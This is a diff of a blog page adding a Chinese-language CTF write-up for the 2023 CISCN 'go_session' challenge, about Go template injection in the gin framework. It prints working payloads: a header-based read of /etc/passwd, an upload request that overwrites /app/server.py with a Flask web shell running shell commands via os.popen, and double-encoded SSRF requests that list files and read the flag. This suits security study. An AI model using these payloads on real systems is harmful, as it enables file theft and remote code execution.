@@ -926,7 +926,157 @@ myexpect<span class="token punctuation">.</span><span class="token function">set
 <p>gin http.Request结构体如下：</p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209201526884.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209201526884.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209201526884"></p>
 <p>可以通过gin Context的Request.Header获取头信息（注意：gin会将输入的http头的首字符换成大写字符）</p>
-<p>比如这里在这里有html.EscapeString过滤双引号，无法直接读文件，可以构造<code>aaa: /etc/passwd</code>的http头，&#96;name&#x3D;</p>
+<p>比如这里在这里有html.EscapeString过滤双引号，无法直接读文件，可以构造<code>aaa: /etc/passwd</code>的http头，以下payload读文件</p>
+<pre class="line-numbers language-none"><code class="language-none">name&#x3D;&#123;%25%20include%20c.Request.Header.Aaa[0]%20%25&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209202455138.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209202455138.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209202455138"></p>
+<ul>
+<li>任意文件写</li>
+</ul>
+<p>通过SaveUploadedFile搭配FormFile写文件</p>
+<p>SaveUploadedFile参数如下，接收一个<code>*multipart.FileHeader</code>对象，一个String作为目标路径。注意到SaveUploadedFile是在gin包的context下，<code>*multipart.FileHeader</code>对象必然来自http对象</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209204112724.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209204112724.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209204112724"></p>
+<p>查看用例可以发现context_test.go中用的FormFile生成的<code>*multipart.FileHeader</code>对象</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209204513188.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209204513188.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209204513188"></p>
+<p>跟进到FormFile，调用了ParseMultipartForm从Context解析文件，并调用了request.go 的FormFile</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209204831159.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209204831159.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209204831159"></p>
+<p>这是一个调用ParseMultipartForm从Request解析文件</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209205308652.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209205308652.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209205308652"></p>
+<p>两个FormFile返回的<code>*multipart.FileHeader</code>对象都能直接在SaveUploadedFile中使用</p>
+<p>比如会解析以下上传文件的数据包（不是题目的环境，而是一个上传文件的普通环境）</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/upload</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">python-requests/2.31.0</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">193</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=01f54ee8f2872c8a0d42d14f70cdc1fe</span></span>
+
+--01f54ee8f2872c8a0d42d14f70cdc1fe
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename="test.png"</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/png</span></span>
+
+This is the file content
+--01f54ee8f2872c8a0d42d14f70cdc1fe--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>得到的f和fhs如下</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209210327544.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209210327544.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209210327544"></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209210224173.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209210224173.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209210224173"></p>
+<p>现在无需上传接口，通过ssti我们能构造向靶机写入任意文件。由于go语言的特性，函数的返回值必须被接收或使用空白标识符 _ 忽略，所以两个返回值的request FormFile无法直接调用</p>
+<p>写文件：</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Header.Filename[0]),c.Request.Header.Filepath[0])&#125;&#125;</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>
+<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">Phpstorm-c886be16=4fe54ddd-bac0-49c8-891f-b23f2d87d891; session-name=MTczMzc0NDkzM3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXx9VHD8fgMEvqUWF-KwBidg8If0fTSh8a3uZYJQX7HK8g==</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">none</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span>
+<span class="token header"><span class="token header-name keyword">Priority</span><span class="token punctuation">:</span> <span class="token header-value">u=0, i</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">191</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=01f54ee8f2872c8a0d42d14f70cdc1fe</span></span>
+<span class="token header"><span class="token header-name keyword">Filename</span><span class="token punctuation">:</span> <span class="token header-value">file</span></span>
+<span class="token header"><span class="token header-name keyword">Filepath</span><span class="token punctuation">:</span> <span class="token header-value">./server.py</span></span>
+
+--01f54ee8f2872c8a0d42d14f70cdc1fe
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename="test.png"</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/png</span></span>
+
+This is the file content
+--01f54ee8f2872c8a0d42d14f70cdc1fe--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>写文件跟这道题有什么关系呢？</p>
+<p>传参<code>/flask?name=</code>，有报错信息。</p>
+<p>报错页面由Werkzeug Debugger提供。而Werkzeug Debugger 是 Flask 在调试模式下的默认功能</p>
+<ul>
+<li>热加载</li>
+</ul>
+<p>通常，设置 <code>debug=True</code> 会启用 Flask 的调试模式，默认会激活 Werkzeug 的热加载功能。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>调试模式中的热加载功能会在代码发生更改时，自动重新加载 Flask 服务</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209213829479.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209213829479.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
+<p>报错还提到了 PIN 控制台：</p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209214150902.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209214150902.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209214150902"></p>
+<p>当 Flask 热加载功能启用时，每次重新加载会生成新的 PIN，用于保护调试控制台。</p>
+<p>当前flask服务器路径为<code>/app/server.py</code></p>
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209214344328.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209214344328.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209214344328"></p>
+<p>看到这里思路也就清晰了</p>
+<p>先通过admin路由go ssti覆盖写server.py，然后SSRF请求flask服务器执行server.py</p>
+<p>恶意flask server：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> os
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
+    <span class="token builtin">file</span><span class="token operator">=</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token builtin">file</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>写&#x2F;app&#x2F;server.py</p>
+<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin?name=&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.Header.Filename[0]),c.Request.Header.Filepath[0])&#125;&#125;</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">efcbd611-8c54-4abc-a9ae-a74d2278a0da.challenge.ctf.show</span></span>
+<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session-name=MTczMzc0NDkzM3xEWDhFQVFMX2dBQUJFQUVRQUFBal80QUFBUVp6ZEhKcGJtY01CZ0FFYm1GdFpRWnpkSEpwYm1jTUJ3QUZZV1J0YVc0PXx9VHD8fgMEvqUWF-KwBidg8If0fTSh8a3uZYJQX7HK8g==</span></span>
+<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0</span></span>
+<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
+<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
+<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://ctf.show/</span></span>
+<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">document</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">navigate</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-site</span></span>
+<span class="token header"><span class="token header-name keyword">Sec-Fetch-User</span><span class="token punctuation">:</span> <span class="token header-value">?1</span></span>
+<span class="token header"><span class="token header-name keyword">Priority</span><span class="token punctuation">:</span> <span class="token header-value">u=0, i</span></span>
+<span class="token header"><span class="token header-name keyword">Te</span><span class="token punctuation">:</span> <span class="token header-value">trailers</span></span>
+<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">421</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=01f54ee8f2872c8a0d42d14f70cdc1fe</span></span>
+<span class="token header"><span class="token header-name keyword">Filename</span><span class="token punctuation">:</span> <span class="token header-value">file</span></span>
+<span class="token header"><span class="token header-name keyword">Filepath</span><span class="token punctuation">:</span> <span class="token header-value">/app/server.py</span></span>
+
+--01f54ee8f2872c8a0d42d14f70cdc1fe
+<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="file"; filename="test.png"</span></span>
+<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">image/png</span></span>
+
+from flask import *
+import os
+app = Flask(__name__)
+
+@app.route('/')
+def index():
+    name = request.args['name']
+    file=os.popen(name).read()
+    return file
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000, debug=True)
+--01f54ee8f2872c8a0d42d14f70cdc1fe--<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>双重url编码SSRF</p>
+<pre class="line-numbers language-none"><code class="language-none">?name&#x3D;?name&#x3D;ls%25%32%30&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209215157076.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209215157076.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209215157076"></p>
+<pre class="line-numbers language-none"><code class="language-none">?name&#x3D;?name&#x3D;cat%25%32%30&#x2F;th1s_1s_f13g<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209215219048.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241209215219048.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241209215219048"></p>
 
       </div>
       <div class="post-tags-categories">
@@ -1126,7 +1276,7 @@ myexpect<span class="token punctuation">.</span><span class="token function">set
   <div class='content'>
     <div class="toc-main">
       <div class="toc-content">
-        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023CISCN"><span class="toc-text">2023CISCN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unzip"><span class="toc-text">Unzip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BackendSerivce"><span class="toc-text">BackendSerivce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deserbug"><span class="toc-text">deserbug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-text">go_session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#go-ssti"><span class="toc-text">go ssti</span></a></li></ol></li></ol></li></ol> -->
+        <!-- <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2023CISCN"><span class="toc-text">2023CISCN</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unzip"><span class="toc-text">Unzip</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BackendSerivce"><span class="toc-text">BackendSerivce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#deserbug"><span class="toc-text">deserbug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#go-session"><span class="toc-text">go_session</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#go-ssti"><span class="toc-text">go ssti</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-text">题解</span></a></li></ol></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
